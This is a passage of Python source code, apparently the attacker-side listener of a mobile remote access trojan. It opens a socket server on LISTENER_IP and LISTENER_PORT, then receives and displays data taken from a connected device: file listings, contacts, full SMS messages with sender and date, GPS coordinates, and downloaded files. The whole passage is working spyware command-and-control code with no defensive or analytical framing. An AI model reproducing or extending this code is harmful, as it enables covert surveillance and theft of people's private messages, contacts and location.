            elif data.startswith("FILE_ENTRY:"):
                parts = data[11:].split('|')
                file_type = "📁" if parts[1] == "DIR" else "📄"
                size = f"({parts[2]} bytes)" if parts[2] != "0" else ""
                print(f"{file_type} {parts[0]} {size}")
            elif data.startswith("LIST_ERROR:"):
                print(f"Error: {data[11:]}")
                break
    
    def handle_contacts(self):
        print("\nContacts:")
        while True:
            data = self.conn.recv(1024).decode().strip()
            if data == "CONTACTS_DONE":
                break
            elif data.startswith("CONTACT:"):
                parts = data[8:].split('|')
                print(f"  👤 {parts[0]}: {parts[1]}")
    
    def handle_sms(self):
        print("\nSMS Messages:")
        while True:
            data = self.conn.recv(1024).decode().strip()
            if data == "SMS_DONE":
                break
            elif data.startswith("SMS_ENTRY:"):
                parts = data[10:].split('|')
                print(f"  💬 From: {parts[0]}")
                print(f"     Date: {parts[1]}")
                print(f"     Text: {parts[2]}\n")
    
    def handle_location(self):
        data = self.conn.recv(1024).decode().strip()
        if data.startswith("LOCATION:"):
            parts = data[9:].split('|')
            print(f"\n📍 Location:")
            print(f"   Latitude: {parts[0]}")
            print(f"   Longitude: {parts[1]}")
            print(f"   Accuracy: {parts[2]}m")
    
    def receive_file(self):
        data = self.conn.recv(1024).decode().strip()
        if data.startswith("FILE_SIZE:"):
            size = int(data[10:])
            filename = input("Save as: ")
            
            with open(filename, 'wb') as f:
                remaining = size
                while remaining > 0:
                    data = self.conn.recv(min(8192, remaining))
                    f.write(data)
                    remaining -= len(data)
            print(f"✅ File saved as {filename}")

def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((LISTENER_IP, LISTENER_PORT))
    server.listen(5)
    
    print(f"\033[92m")
